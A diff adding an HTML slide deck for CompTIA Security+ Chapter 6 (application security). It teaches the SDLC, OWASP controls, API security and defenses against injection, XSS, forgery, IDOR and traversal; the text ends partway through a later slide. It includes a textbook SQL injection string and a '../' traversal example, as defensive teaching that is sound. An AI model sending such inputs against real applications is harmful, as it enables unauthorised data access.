@@ -1,0 +1,654 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>CompTIA Security+ Ch. 6: Application Security</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700;800&display=swap" rel="stylesheet" />
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #18181b; /* zinc-900 */
+            color: #e4e4e7; /* light text */
+            overflow: hidden; /* Prevent scrolling the whole page */
+        }
+        .slide {
+            display: none;
+            opacity: 0;
+            transition: opacity 0.5s ease-in-out;
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 80px; /* Space for navigation */
+            overflow-y: auto; /* Allow individual slides to scroll if content overflows */
+        }
+        .slide.active {
+            display: block;
+            opacity: 1;
+        }
+        /* Custom scrollbar for webkit browsers */
+        .slide::-webkit-scrollbar { width: 8px; }
+        .slide::-webkit-scrollbar-track { background: #27272a; }
+        .slide::-webkit-scrollbar-thumb {
+            background-color: #52525b;
+            border-radius: 10px;
+            border: 2px solid #27272a;
+        }
+    </style>
+</head>
+<body class="antialiased">
+    <div id="presentation-container" class="relative w-full h-screen">
+        <!-- Slide 1: Title -->
+        <div class="slide active p-6 md:p-12">
+            <div class="w-full h-full flex items-center justify-center">
+                <div class="text-center max-w-4xl mx-auto">
+                    <h1 class="text-4xl md:text-6xl font-extrabold text-transparent bg-clip-text bg-gradient-to-r from-purple-400 to-violet-500 mb-4">CompTIA Security+ Chapter 6</h1>
+                    <h2 class="text-2xl md:text-4xl font-bold text-gray-300 mb-8">Application Security</h2>
+                    <div class="bg-zinc-800 border border-zinc-700 rounded-lg p-6 inline-block">
+                        <p class="text-lg font-semibold text-gray-300">Domains: 2.0 (Threats), 4.0 (Operations) & 5.0 (Management)</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 2: Learning Objectives -->
+        <div class="slide p-6 md:p-12">
+            <div class="max-w-4xl mx-auto">
+                <h2 class="text-3xl md:text-4xl font-bold mb-8 text-center text-gray-300">Learning Objectives</h2>
+                <div class="space-y-4">
+                    <div class="bg-zinc-800/50 border border-zinc-700 rounded-lg p-5">
+                        <h3 class="text-xl font-semibold text-purple-400 mb-2">🔒 Integrate Security into the SDLC</h3>
+                        <p class="text-gray-400">Understand the phases of the Software Development Lifecycle (SDLC) and the role of DevSecOps.</p>
+                    </div>
+                    <div class="bg-zinc-800/50 border border-zinc-700 rounded-lg p-5">
+                        <h3 class="text-xl font-semibold text-purple-400 mb-2">✍️ Apply Secure Coding Practices</h3>
+                        <p class="text-gray-400">Use OWASP-aligned practices (Proactive Controls) and secure APIs by design.</p>
+                    </div>
+                    <div class="bg-zinc-800/50 border border-zinc-700 rounded-lg p-5">
+                        <h3 class="text-xl font-semibold text-purple-400 mb-2">💉 Analyze Common Vulnerabilities</h3>
+                        <p class="text-gray-400">Explain SQLi, XSS, buffer overflows, race conditions, forgery, replay, and directory traversal.</p>
+                    </div>
+                    <div class="bg-zinc-800/50 border border-zinc-700 rounded-lg p-5">
+                        <h3 class="text-xl font-semibold text-purple-400 mb-2">🛡️ Implement Application Security Controls</h3>
+                        <p class="text-gray-400">Apply input validation, WAFs, code signing, sandboxing, SCA, and logging/monitoring.</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 3: Building Security In -->
+        <div class="slide p-6 md:p-12">
+            <div class="max-w-4xl mx-auto">
+                <h2 class="text-3xl md:text-4xl font-bold mb-6 text-center text-gray-300">Building Security In, Not Bolting It On</h2>
+                <div class="bg-zinc-800/50 border border-zinc-700 rounded-lg p-5 text-center mb-6">
+                    <h3 class="text-xl font-semibold text-purple-400 mb-3">Software Development Lifecycle (SDLC) Phases</h3>
+                    <p class="text-gray-400 text-sm md:text-base">Planning ➡️ Requirements ➡️ Design ➡️ Coding ➡️ Testing ➡️ Training/Transition ➡️ Operations & Maintenance ➡️ Decommissioning</p>
+                </div>
+                <div class="bg-purple-900/20 border border-purple-500/30 rounded-lg p-5 mb-6">
+                    <h3 class="text-xl font-semibold text-purple-400 mb-3 text-center">⚙️ What is DevSecOps?</h3>
+                    <p class="text-purple-300">DevSecOps integrates security into DevOps. Security is a shared responsibility throughout the SDLC (“shift left”), with automated checks and continuous monitoring aligned to CI/CD.</p>
+                </div>
+                <div class="bg-zinc-800/50 border border-zinc-700 rounded-lg p-5">
+                    <h4 class="text-lg font-semibold text-gray-300 mb-2">🚀 Real-World Example: CI/CD Pipeline Security</h4>
+                    <p class="text-gray-400">On each commit, the pipeline triggers SAST, SCA (dependency scanning), DAST, and policy checks; failures block promotion to staging/production and feed tickets to remediation.</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 4: Deployment Environments -->
+        <div class="slide p-6 md:p-12">
+            <div class="max-w-4xl mx-auto text-center">
+                <h2 class="text-3xl md:text-4xl font-bold mb-8 text-gray-300">Code Deployment Environments</h2>
+                <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6">
+                    <div class="bg-zinc-800/50 border border-zinc-700 rounded-lg p-5">
+                        <h3 class="text-xl font-semibold text-purple-400 mb-2">Development</h3>
+                        <p class="text-gray-400">Where developers build and test units locally. Often isolated per developer.</p>
+                    </div>
+                    <div class="bg-zinc-800/50 border border-zinc-700 rounded-lg p-5">
+                        <h3 class="text-xl font-semibold text-purple-400 mb-2">Testing</h3>
+                        <p class="text-gray-400">QA and integration testing environments.</p>
+                    </div>
+                    <div class="bg-zinc-800/50 border border-zinc-700 rounded-lg p-5">
+                        <h3 class="text-xl font-semibold text-purple-400 mb-2">Staging</h3>
+                        <p class="text-gray-400">Pre-production mirror for UAT and final checks.</p>
+                    </div>
+                    <div class="bg-zinc-800/50 border border-zinc-700 rounded-lg p-5">
+                        <h3 class="text-xl font-semibold text-purple-400 mb-2">Production</h3>
+                        <p class="text-gray-400">Live environment used by customers.</p>
+                    </div>
+                </div>
+                <p class="mt-6 text-gray-500">Formal change management governs promotion between environments.</p>
+            </div>
+        </div>
+
+        <!-- Slide 5: OWASP Proactive Controls (expanded) -->
+        <div class="slide p-6 md:p-12">
+            <div class="max-w-4xl mx-auto">
+                <h2 class="text-3xl md:text-4xl font-bold mb-6 text-center text-gray-300">OWASP Proactive Controls: A Developer's Checklist</h2>
+                <div class="grid md:grid-cols-2 gap-6">
+                    <div class="bg-zinc-800/50 border border-zinc-700 rounded-lg p-5">
+                        <h3 class="text-xl font-semibold text-purple-400 mb-2">📋 Define Security Requirements</h3>
+                        <p class="text-gray-400">Capture security stories and acceptance criteria early.</p>
+                    </div>
+                    <div class="bg-zinc-800/50 border border-zinc-700 rounded-lg p-5">
+                        <h3 class="text-xl font-semibold text-purple-400 mb-2">🧱 Leverage Frameworks & Libraries</h3>
+                        <p class="text-gray-400">Use vetted frameworks; avoid reinventing controls.</p>
+                    </div>
+                    <div class="bg-zinc-800/50 border border-zinc-700 rounded-lg p-5">
+                        <h3 class="text-xl font-semibold text-purple-400 mb-2">✅ Validate All Inputs</h3>
+                        <p class="text-gray-400">Treat all input as untrusted; prefer allow lists.</p>
+                    </div>
+                    <div class="bg-zinc-800/50 border border-zinc-700 rounded-lg p-5">
+                        <h3 class="text-xl font-semibold text-purple-400 mb-2">🔏 Secure Database Access</h3>
+                        <p class="text-gray-400">Parameterized queries, least privilege, rotation.</p>
+                    </div>
+                    <div class="bg-zinc-800/50 border border-zinc-700 rounded-lg p-5">
+                        <h3 class="text-xl font-semibold text-purple-400 mb-2">🔡 Encode & Escape Data</h3>
+                        <p class="text-gray-400">Contextual output encoding to prevent XSS.</p>
+                    </div>
+                    <div class="bg-zinc-800/50 border border-zinc-700 rounded-lg p-5">
+                        <h3 class="text-xl font-semibold text-purple-400 mb-2">🪪 Implement Digital Identity</h3>
+                        <p class="text-gray-400">MFA, secure password storage, robust session handling.</p>
+                    </div>
+                    <div class="bg-zinc-800/50 border border-zinc-700 rounded-lg p-5">
+                        <h3 class="text-xl font-semibold text-purple-400 mb-2">🔒 Enforce Access Controls</h3>
+                        <p class="text-gray-400">Deny by default; check authZ on every request.</p>
+                    </div>
+                    <div class="bg-zinc-800/50 border border-zinc-700 rounded-lg p-5">
+                        <h3 class="text-xl font-semibold text-purple-400 mb-2">🔐 Protect Data Everywhere</h3>
+                        <p class="text-gray-400">TLS in transit; strong encryption at rest.</p>
+                    </div>
+                    <div class="bg-zinc-800/50 border border-zinc-700 rounded-lg p-5">
+                        <h3 class="text-xl font-semibold text-purple-400 mb-2">📜 Security Logging & Monitoring</h3>
+                        <p class="text-gray-400">Centralize logs; alert on anomalies; retain for IR.</p>
+                    </div>
+                    <div class="bg-zinc-800/50 border border-zinc-700 rounded-lg p-5">
+                        <h3 class="text-xl font-semibold text-purple-400 mb-2">🧯 Handle Errors & Exceptions</h3>
+                        <p class="text-gray-400">Fail safely; don’t leak stack traces or secrets.</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- NEW Slide 6: OWASP Top 10 (Web Apps) -->
+        <div class="slide p-6 md:p-12">
+            <div class="max-w-4xl mx-auto">
+                <h2 class="text-3xl md:text-4xl font-bold mb-6 text-center text-gray-300">OWASP Top 10 (Web Apps)</h2>
+                <div class="bg-zinc-800/50 border border-zinc-700 rounded-lg p-5">
+                    <p class="text-gray-400 mb-4">Quick reference (Top 10 – 2021 edition, current as of Sept 2025). Categories:</p>
+                    <div class="grid md:grid-cols-2 gap-4 text-gray-300">
+                        <ul class="list-disc list-inside space-y-1 text-gray-400">
+                            <li>A01 Broken Access Control</li>
+                            <li>A02 Cryptographic Failures</li>
+                            <li>A03 Injection</li>
+                            <li>A04 Insecure Design</li>
+                            <li>A05 Security Misconfiguration</li>
+                        </ul>
+                        <ul class="list-disc list-inside space-y-1 text-gray-400">
+                            <li>A06 Vulnerable & Outdated Components</li>
+                            <li>A07 Identification & Authentication Failures</li>
+                            <li>A08 Software & Data Integrity Failures</li>
+                            <li>A09 Security Logging & Monitoring Failures</li>
+                            <li>A10 Server-Side Request Forgery (SSRF)</li>
+                        </ul>
+                    </div>
+                    <p class="text-xs text-gray-500 mt-4">Note: OWASP has announced a 2025 update; track changes and map controls accordingly.</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 7: API Security -->
+        <div class="slide p-6 md:p-12">
+            <div class="max-w-4xl mx-auto">
+                <h2 class="text-3xl md:text-4xl font-bold mb-6 text-center text-gray-300">API Security</h2>
+                <div class="bg-zinc-800/50 border border-zinc-700 rounded-lg p-5">
+                    <p class="text-lg text-gray-300 mb-4">APIs are prime targets; secure design and controls are critical.</p>
+                    <h3 class="text-xl font-semibold text-purple-400 mb-3">Key API Security Controls</h3>
+                    <ul class="space-y-2 text-gray-400 list-disc list-inside">
+                        <li><strong>Authentication & Authorization:</strong> Strong authN; granular authZ (BOLA/BOPLA aware).</li>
+                        <li><strong>Data Scoping:</strong> Return only necessary fields; avoid mass assignment.</li>
+                        <li><strong>Rate Limiting:</strong> Throttle abusive clients to prevent DoS and cost spikes.</li>
+                        <li><strong>Input Filtering:</strong> Validate all inputs and schemas.</li>
+                        <li><strong>Monitoring & Logging:</strong> Trace IDs; detect anomalies; retain logs for IR.</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 8: Software Security Testing (expanded) -->
+        <div class="slide p-6 md:p-12">
+            <div class="max-w-4xl mx-auto">
+                <h2 class="text-3xl md:text-4xl font-bold mb-6 text-center text-gray-300">Software Security Testing</h2>
+                <div class="grid md:grid-cols-3 gap-6 text-center">
+                    <div class="bg-zinc-800/50 border border-zinc-700 rounded-lg p-5">
+                        <h3 class="text-xl font-semibold text-purple-400 mb-3">Static Analysis (SAST)</h3>
+                        <p class="text-gray-400">Analyze source/bytecode without executing; find code-level flaws early.</p>
+                    </div>
+                    <div class="bg-zinc-800/50 border border-zinc-700 rounded-lg p-5">
+                        <h3 class="text-xl font-semibold text-purple-400 mb-3">Dynamic Analysis (DAST)</h3>
+                        <p class="text-gray-400">Probe running apps for vulns at runtime via interfaces.</p>
+                    </div>
+                    <div class="bg-zinc-800/50 border border-zinc-700 rounded-lg p-5">
+                        <h3 class="text-xl font-semibold text-purple-400 mb-3">Fuzzing</h3>
+                        <p class="text-gray-400">Send unexpected data to trigger crashes or undefined behavior.</p>
+                    </div>
+                </div>
+                <div class="grid md:grid-cols-2 gap-6 mt-6">
+                    <div class="bg-zinc-800/50 border border-zinc-700 rounded-lg p-5">
+                        <h3 class="text-xl font-semibold text-purple-400 mb-3">📦 Software Composition Analysis (SCA)</h3>
+                        <p class="text-gray-400">Continuously scan dependencies (SBOM), flag known CVEs, and enforce update policies.</p>
+                    </div>
+                    <div class="bg-zinc-800/50 border border-zinc-700 rounded-lg p-5">
+                        <h3 class="text-xl font-semibold text-purple-400 mb-3">👀 Code Review & Testing Strategy</h3>
+                        <p class="text-gray-400">Peer review, unit/integration tests, and regression suites tied to security requirements.</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 9: SQL Injection (updated stats) -->
+        <div class="slide p-6 md:p-12">
+            <div class="max-w-4xl mx-auto">
+                <h2 class="text-3xl md:text-4xl font-bold mb-6 text-center text-gray-300">Injection Vulnerabilities: SQLi</h2>
+                <div class="bg-red-900/20 border border-red-500/30 rounded-lg p-5 text-center mb-6">
+                    <h3 class="text-xl font-semibold text-red-400 mb-2">💉 SQL Injection (SQLi)</h3>
+                    <p class="text-red-300">Occurs when user input is inserted into queries without proper parameterization. Example: <code class="bg-zinc-900 p-1 rounded-md text-gray-300">' OR 1=1;--</code>.</p>
+                </div>
+                <div class="bg-zinc-800/50 border border-zinc-700 rounded-lg p-5">
+                    <h4 class="text-lg font-semibold text-gray-300 mb-2">🚨 Real-World Example: MOVEit Transfer Exploitation (2023)</h4>
+                    <p class="text-gray-400">The Cl0p group exploited a critical SQLi in MOVEit Transfer. Public tallies attribute impacts to <span class="font-semibold">&gt;2,500 organizations</span> and roughly <span class="font-semibold">~93 million individuals</span>, demonstrating supply-chain blast radius when widely used software has a single flaw.</p>
+                </div>
+                <div class="bg-emerald-900/20 border border-emerald-500/30 rounded-lg p-5 mt-6">
+                    <h4 class="text-lg font-semibold text-emerald-300 mb-2">🛡️ Defenses</h4>
+                    <ul class="list-disc list-inside text-gray-300 space-y-1">
+                        <li>Use <span class="font-semibold">parameterized queries</span> / prepared statements (bind variables) — never string concatenation.</li>
+                        <li>Prefer safe ORM/query builders; validate identifiers server-side with allow lists.</li>
+                        <li>Grant <span class="font-semibold">least-privilege</span> DB roles; separate read vs. write accounts.</li>
+                        <li>Apply <span class="font-semibold">input validation</span> and constrain query shape; monitor with SAST/DAST and WAF virtual patching.</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 10: Other Injection Attacks -->
+        <div class="slide p-6 md:p-12">
+            <div class="max-w-4xl mx-auto">
+                <h2 class="text-3xl md:text-4xl font-bold mb-6 text-center text-gray-300">Other Injection Attacks</h2>
+                <div class="space-y-4">
+                    <div class="bg-zinc-800/50 border border-zinc-700 rounded-lg p-5">
+                        <h3 class="text-xl font-semibold text-purple-400 mb-2">Command Injection</h3>
+                        <p class="text-gray-400">Unsafely concatenated input executes OS commands.</p>
+                    </div>
+                    <div class="bg-zinc-800/50 border border-zinc-700 rounded-lg p-5">
+                        <h3 class="text-xl font-semibold text-purple-400 mb-2">LDAP Injection</h3>
+                        <p class="text-gray-400">Manipulates directory queries to bypass authZ or enumerate data.</p>
+                    </div>
+                    <div class="bg-zinc-800/50 border border-zinc-700 rounded-lg p-5">
+                        <h3 class="text-xl font-semibold text-purple-400 mb-2">XML/XXE Injection</h3>
+                        <p class="text-gray-400">Abuses XML parsers; may read files or SSRF via external entities.</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 11: XSS -->
+        <div class="slide p-6 md:p-12">
+            <div class="max-w-4xl mx-auto">
+                <h2 class="text-3xl md:text-4xl font-bold mb-6 text-center text-gray-300">Injection Vulnerabilities: XSS</h2>
+                <div class="bg-red-900/20 border border-red-500/30 rounded-lg p-5 text-center mb-6">
+                    <h3 class="text-xl font-semibold text-red-400 mb-2">🎭 Cross-Site Scripting (XSS)</h3>
+                    <p class="text-red-300">Malicious scripts run in victims’ browsers due to improper output encoding.</p>
+                </div>
+                <div class="grid md:grid-cols-2 gap-6">
+                    <div class="bg-zinc-800/50 border border-zinc-700 rounded-lg p-5">
+                        <h3 class="text-xl font-semibold text-purple-400 mb-2">Reflected XSS</h3>
+                        <p class="text-gray-400">Payload comes from the current request (e.g., crafted link).</p>
+                    </div>
+                    <div class="bg-zinc-800/50 border border-zinc-700 rounded-lg p-5">
+                        <h3 class="text-xl font-semibold text-purple-400 mb-2">Stored (Persistent) XSS</h3>
+                        <p class="text-gray-400">Payload is stored server-side (e.g., comments) and served to users.</p>
+                    </div>
+                </div>
+                <div class="bg-emerald-900/20 border border-emerald-500/30 rounded-lg p-5 mt-6">
+                    <h4 class="text-lg font-semibold text-emerald-300 mb-2">🛡️ Defenses</h4>
+                    <ul class="list-disc list-inside text-gray-300 space-y-1">
+                        <li><span class="font-semibold">Contextual output encoding</span> (HTML/attr/JS/URL) and auto-escaping templates.</li>
+                        <li><span class="font-semibold">Content Security Policy</span> with nonces; avoid inline event handlers.</li>
+                        <li>Sanitize only when rich HTML is required; otherwise store & render as plain text.</li>
+                        <li>Cookies: <code class="bg-zinc-900 px-1 rounded">HttpOnly</code> (limits theft), <code class="bg-zinc-900 px-1 rounded">Secure</code>, <code class="bg-zinc-900 px-1 rounded">SameSite</code>.</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 13: Memory and Timing Attacks (expanded) -->
+        <div class="slide p-6 md:p-12">
+            <div class="max-w-4xl mx-auto">
+                <h2 class="text-3xl md:text-4xl font-bold mb-6 text-center text-gray-300">Memory and Timing Attacks</h2>
+                <div class="grid md:grid-cols-2 gap-6 mb-6">
+                    <div class="bg-zinc-800/50 border border-zinc-700 rounded-lg p-5">
+                        <h3 class="text-xl font-semibold text-purple-400 mb-2">🌊 Buffer Overflow</h3>
+                        <p class="text-gray-400">Overwrites memory to alter control flow (a.k.a. memory injection).</p>
+                    </div>
+                    <div class="bg-zinc-800/50 border border-zinc-700 rounded-lg p-5">
+                        <h3 class="text-xl font-semibold text-purple-400 mb-2">🏃 Race Condition (TOCTTOU)</h3>
+                        <p class="text-gray-400">Mismatch between Time-of-Check and Time-of-Use on the Target of Evaluation (TOE).</p>
+                    </div>
+                </div>
+                <div class="bg-zinc-800/50 border border-zinc-700 rounded-lg p-5 mb-6">
+                    <h3 class="text-xl font-semibold text-purple-400 mb-2">🧩 Null Pointer Dereference</h3>
+                    <p class="text-gray-400">Dereferencing <em>null</em> can crash apps (info leakage) or, in rare designs, bypass checks. Validate inputs and handle exceptions safely.</p>
+                </div>
+                <div class="bg-zinc-800/50 border border-zinc-700 rounded-lg p-5">
+                    <h4 class="text-lg font-semibold text-gray-300 mb-2">🚨 Real-World Example: "Dirty COW" (CVE-2016-5195)</h4>
+                    <p class="text-gray-400">A race condition in the Linux kernel enabled local privilege escalation to root by exploiting copy-on-write behavior.</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- NEW Slide 14: Other Application Attacks (Replay & PrivEsc) -->
+        <div class="slide p-6 md:p-12">
+            <div class="max-w-4xl mx-auto">
+                <h2 class="text-3xl md:text-4xl font-bold mb-6 text-center text-gray-300">Other Application Attacks</h2>
+                <div class="grid md:grid-cols-2 gap-6">
+                    <div class="bg-zinc-800/50 border border-zinc-700 rounded-lg p-5">
+                        <h3 class="text-xl font-semibold text-purple-400 mb-2">🔁 Replay Attacks</h3>
+                        <p class="text-gray-400">Captured credentials or session tokens are reused to impersonate users. Mitigate with MFA, short-lived/nonce-based tokens, TLS, and clock-aware server checks.</p>
+                    </div>
+                    <div class="bg-zinc-800/50 border border-zinc-700 rounded-lg p-5">
+                        <h3 class="text-xl font-semibold text-purple-400 mb-2">⬆️ Privilege Escalation</h3>
+                        <p class="text-gray-400">Abusing flaws/misconfigs to gain higher privileges (e.g., vulnerable services, reused hashes). Enforce least privilege, patch promptly, and add exploit mitigations (ASLR/DEP).</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 15: Forgery Attacks (session + CSRF + SSRF + cookies) -->
+        <div class="slide p-6 md:p-12">
+            <div class="max-w-4xl mx-auto">
+                <h2 class="text-3xl md:text-4xl font-bold mb-6 text-center text-gray-300">Session & Request Forgery Attacks</h2>
+                <div class="grid md:grid-cols-2 gap-6 mb-6">
+                    <div class="bg-zinc-800/50 border border-zinc-700 rounded-lg p-5">
+                        <h3 class="text-xl font-semibold text-purple-400 mb-2">🍪 Session Hijacking</h3>
+                        <p class="text-gray-400">Stealing/abusing session cookies to impersonate users.</p>
+                        <ul class="list-disc list-inside text-gray-400 mt-2 space-y-1">
+                            <li><span class="font-semibold">Cookie flags:</span> <code class="bg-zinc-900 px-1 rounded">Secure</code>, <code class="bg-zinc-900 px-1 rounded">HttpOnly</code>, <code class="bg-zinc-900 px-1 rounded">SameSite</code></li>
+                            <li>Rotate/expire on privilege change; bind to device/IP as appropriate.</li>
+                        </ul>
+                    </div>
+                    <div class="bg-zinc-800/50 border border-zinc-700 rounded-lg p-5">
+                        <h3 class="text-xl font-semibold text-purple-400 mb-2">Cross-Site Request Forgery (CSRF)</h3>
+                        <p class="text-gray-400">Tricks a logged-in browser into sending unwanted requests. Use anti-CSRF tokens and SameSite cookies.</p>
+                    </div>
+                </div>
+                <div class="bg-zinc-800/50 border border-zinc-700 rounded-lg p-5">
+                    <h3 class="text-xl font-semibold text-purple-400 mb-2">☁️ Server-Side Request Forgery (SSRF)</h3>
+                    <p class="text-gray-400">Forces the server to fetch internal resources (e.g., cloud metadata). Egress filtering and allow lists reduce risk.</p>
+                </div>
+                <div class="bg-emerald-900/20 border border-emerald-500/30 rounded-lg p-5 mt-6">
+                    <h4 class="text-lg font-semibold text-emerald-300 mb-2">🛡️ Defense Playbook</h4>
+                    <ul class="list-disc list-inside text-gray-300 space-y-1">
+                        <li>Sessions: <code class="bg-zinc-900 px-1 rounded">Secure</code> + <code class="bg-zinc-900 px-1 rounded">HttpOnly</code> + <code class="bg-zinc-900 px-1 rounded">SameSite</code>; rotate on login/priv-change; short TTL.</li>
+                        <li>CSRF: Anti-CSRF tokens, Origin/Referer validation, re-auth for sensitive operations.</li>
+                        <li>SSRF: Egress allow lists; block link-local/metadata IPs; strict URL parsing; disable redirects; segment networks; enforce IMDSv2.</li>
+                        <li>Transport: Enforce HTTPS (HSTS) and consider mTLS for internal service-to-service calls.</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 16: IDOR -->
+        <div class="slide p-6 md:p-12">
+            <div class="max-w-4xl mx-auto">
+                <h2 class="text-3xl md:text-4xl font-bold mb-6 text-center text-gray-300">Authorization Flaw: IDOR</h2>
+                <div class="bg-red-900/20 border border-red-500/30 rounded-lg p-5 text-center mb-6">
+                    <h3 class="text-xl font-semibold text-red-400 mb-2">💔 Insecure Direct Object References (IDOR)</h3>
+                    <p class="text-red-300">Direct object access via user-controlled identifiers without proper authZ checks.</p>
+                </div>
+                <div class="bg-zinc-800/50 border border-zinc-700 rounded-lg p-5">
+                    <h4 class="text-lg font-semibold text-gray-300 mb-2">Example</h4>
+                    <p class="text-gray-400">User at <code class="bg-zinc-900 p-1 rounded-md">/invoices?id=123</code> changes to <code class="bg-zinc-900 p-1 rounded-md">/invoices?id=124</code> and accesses another user’s data.</p>
+                </div>
+                <div class="bg-emerald-900/20 border border-emerald-500/30 rounded-lg p-5 mt-6">
+                    <h4 class="text-lg font-semibold text-emerald-300 mb-2">🛡️ Defenses</h4>
+                    <ul class="list-disc list-inside text-gray-300 space-y-1">
+                        <li><span class="font-semibold">Object-level authorization</span> on every access (ownership/ACL checks) — deny by default.</li>
+                        <li>Use <span class="font-semibold">indirect references</span> (opaque IDs) and scope queries by current user/tenant.</li>
+                        <li>Log and alert on access to objects not owned by the caller; rate-limit enumeration attempts.</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 17: Directory Traversal -->
+        <div class="slide p-6 md:p-12">
+            <div class="max-w-4xl mx-auto">
+                <h2 class="text-3xl md:text-4xl font-bold mb-6 text-center text-gray-300">Authorization Flaw: Directory Traversal</h2>
+                <div class="bg-red-900/20 border border-red-500/30 rounded-lg p-5 text-center mb-6">
+                    <h3 class="text-xl font-semibold text-red-400 mb-2">📂 Directory Traversal</h3>
+                    <p class="text-red-300">Using <code class="bg-zinc-900 px-1 rounded">../</code> to escape the intended path and read sensitive files.</p>
+                </div>
+                <div class="bg-zinc-800/50 border border-zinc-700 rounded-lg p-5">
+                    <h3 class="text-xl font-semibold text-purple-400 mb-2">File Inclusion (LFI/RFI)</h3>
+                    <p class="text-gray-400">Including files for execution rather than display may lead to remote code execution.</p>
+                </div>
+                <div class="bg-emerald-900/20 border border-emerald-500/30 rounded-lg p-5 mt-6">
+                    <h4 class="text-lg font-semibold text-emerald-300 mb-2">🛡️ Defenses</h4>
+                    <ul class="list-disc list-inside text-gray-300 space-y-1">
+                        <li><span class="font-semibold">Canonicalize</span> (e.g., <code class="bg-zinc-900 px-1 rounded">realpath</code>) and verify the resolved path stays under the allowed base directory.</li>
+                        <li>Enforce <span class="font-semibold">allow-listed filenames/IDs</span>; reject <code class="bg-zinc-900 px-1 rounded">../</code>, encoded traversal, and path separators.</li>
+                        <li>Filesystem hardening: non-privileged user, read-only asset dirs, no symlink follow, chroot/jail/container; SELinux/AppArmor confinement.</li>
+                    </ul>
+                </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 19: Application Security Controls -->
+        <div class="slide p-6 md:p-12">
+            <div class="max-w-4xl mx-auto">
+                <h2 class="text-3xl md:text-4xl font-bold mb-6 text-center text-gray-300">Application Security Controls</h2>
+                <div class="grid md:grid-cols-2 lg:grid-cols-3 gap-6">
+                    <div class="bg-zinc-800/50 border border-zinc-700 rounded-lg p-5">
+                        <h3 class="text-xl font-semibold text-purple-400 mb-2">Web Application Firewall (WAF)</h3>
+                        <p class="text-gray-400">Layer-7 filtering to block common attacks (SQLi/XSS); virtual patching for emergent CVEs.</p>
+                    </div>
+                    <div class="bg-zinc-800/50 border border-zinc-700 rounded-lg p-5">
+                        <h3 class="text-xl font-semibold text-purple-400 mb-2">Runtime App Self-Protection (RASP)</h3>
+                        <p class="text-gray-400">In-process hooks to detect/block exploits at runtime (e.g., deserialization, command injection).</p>
+                    </div>
+                    <div class="bg-zinc-800/50 border border-zinc-700 rounded-lg p-5">
+                        <h3 class="text-xl font-semibold text-purple-400 mb-2">Security Headers & CSP</h3>
+                        <p class="text-gray-400">CSP, HSTS, X-Frame-Options, Referrer-Policy, Permissions-Policy to harden browsers.</p>
+                    </div>
+                    <div class="bg-zinc-800/50 border border-zinc-700 rounded-lg p-5">
+                        <h3 class="text-xl font-semibold text-purple-400 mb-2">Rate Limiting & Bot Mitigation</h3>
+                        <p class="text-gray-400">Per-IP/user quotas, CAPTCHAs or bot signals; protect login/API endpoints from abuse.</p>
+                    </div>
+                    <div class="bg-zinc-800/50 border border-zinc-700 rounded-lg p-5">
+                        <h3 class="text-xl font-semibold text-purple-400 mb-2">Secrets Management</h3>
+                        <p class="text-gray-400">Central vault/KMS; rotation; no secrets in code or images; just-in-time credentials.</p>
+                    </div>
+                    <div class="bg-zinc-800/50 border border-zinc-700 rounded-lg p-5">
+                        <h3 class="text-xl font-semibold text-purple-400 mb-2">Centralized Input Validation</h3>
+                        <p class="text-gray-400">Shared validation libraries/gateways; canonicalization and strict allow lists.</p>
+                    </div>
+                    <div class="bg-zinc-800/50 border border-zinc-700 rounded-lg p-5">
+                        <h3 class="text-xl font-semibold text-purple-400 mb-2">mTLS & Service Auth</h3>
+                        <p class="text-gray-400">Mutual TLS between services; signed tokens (OIDC/JWT) with short lifetimes.</p>
+                    </div>
+                    <div class="bg-zinc-800/50 border border-zinc-700 rounded-lg p-5">
+                        <h3 class="text-xl font-semibold text-purple-400 mb-2">IAM, RBAC/ABAC & PEP</h3>
+                        <p class="text-gray-400">Central policy decision/enforcement; deny-by-default; least privilege at every layer.</p>
+                    </div>
+                    <div class="bg-zinc-800/50 border border-zinc-700 rounded-lg p-5">
+                        <h3 class="text-xl font-semibold text-purple-400 mb-2">Egress Control & Segmentation</h3>
+                        <p class="text-gray-400">Restrict outbound calls; block link-local/metadata; segment networks to contain SSRF.</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <!-- Slide 20: Code Integrity and Automation (expanded) -->
+        <div class="slide p-6 md:p-12">
+            <div class="max-w-4xl mx-auto">
+                <h2 class="text-3xl md:text-4xl font-bold mb-6 text-center text-gray-300">Code Integrity and Automation</h2>
+                <div class="grid md:grid-cols-2 gap-6">
+                    <div class="bg-zinc-800/50 border border-zinc-700 rounded-lg p-5">
+                        <h3 class="text-xl font-semibold text-purple-400 mb-3">🔑 Code Security Practices</h3>
+                        <ul class="space-y-2 text-gray-400 list-disc list-inside">
+                            <li><strong>Code Signing:</strong> Authenticate publisher; verify integrity on install/run.</li>
+                            <li><strong>No Hard-Coded Secrets:</strong> Use vault/KMS; inject via env/CI; rotate keys.</li>
+                            <li><strong>Package Hygiene:</strong> SCA, version pinning, private registries, SBOMs.</li>
+                            <li><strong>Update Integrity:</strong> Signed update channels; checksum verification; rollback plans.</li>
